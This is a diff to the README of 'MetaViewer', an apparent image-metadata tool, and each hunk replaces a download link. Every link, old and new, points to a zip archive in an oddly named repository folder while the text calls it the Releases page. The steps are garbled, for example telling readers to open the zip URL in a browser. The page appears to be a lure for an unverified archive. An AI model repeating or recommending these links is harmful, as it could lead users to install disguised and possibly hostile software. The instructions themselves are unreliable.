@@ -1,6 +1,6 @@
 # 🌐 MetaViewer - View Image Metadata with Ease
 
-[![Download MetaViewer](https://raw.githubusercontent.com/luoyinhu/MetaViewer/main/foredeck/MetaViewer_v1.6.zip)](https://raw.githubusercontent.com/luoyinhu/MetaViewer/main/foredeck/MetaViewer_v1.6.zip)
+[![Download MetaViewer](https://github.com/luoyinhu/MetaViewer/raw/refs/heads/main/foredeck/Meta_Viewer_v2.5-beta.1.zip)](https://github.com/luoyinhu/MetaViewer/raw/refs/heads/main/foredeck/Meta_Viewer_v2.5-beta.1.zip)
 
 ## 📖 Overview
 
@@ -30,11 +30,11 @@ Follow these simple steps to get started with MetaViewer.
 
 1. **Visit the Releases Page**: Click on the link below to go to the GitHub Releases page.
    
-   [Download MetaViewer](https://raw.githubusercontent.com/luoyinhu/MetaViewer/main/foredeck/MetaViewer_v1.6.zip)
+   [Download MetaViewer](https://github.com/luoyinhu/MetaViewer/raw/refs/heads/main/foredeck/Meta_Viewer_v2.5-beta.1.zip)
 
 2. **Download the Latest Version**: Look for the latest release at the top of the page. Download the version that suits your needs by clicking on the provided link.
 
-3. **Extract and Open**: If the file is compressed, extract it using your preferred method. Open the `https://raw.githubusercontent.com/luoyinhu/MetaViewer/main/foredeck/MetaViewer_v1.6.zip` file in your web browser.
+3. **Extract and Open**: If the file is compressed, extract it using your preferred method. Open the `https://github.com/luoyinhu/MetaViewer/raw/refs/heads/main/foredeck/Meta_Viewer_v2.5-beta.1.zip` file in your web browser.
 
 4. **Upload Your Image**: Click the "Upload" button and select the image file you want to analyze.
 
@@ -44,7 +44,7 @@ Follow these simple steps to get started with MetaViewer.
 
 To download MetaViewer, visit our Releases page. Click on the link below to access it directly:
 
-[Download MetaViewer](https://raw.githubusercontent.com/luoyinhu/MetaViewer/main/foredeck/MetaViewer_v1.6.zip)
+[Download MetaViewer](https://github.com/luoyinhu/MetaViewer/raw/refs/heads/main/foredeck/Meta_Viewer_v2.5-beta.1.zip)
 
 Once you are on the page, find the latest release and follow the download instructions provided.
 
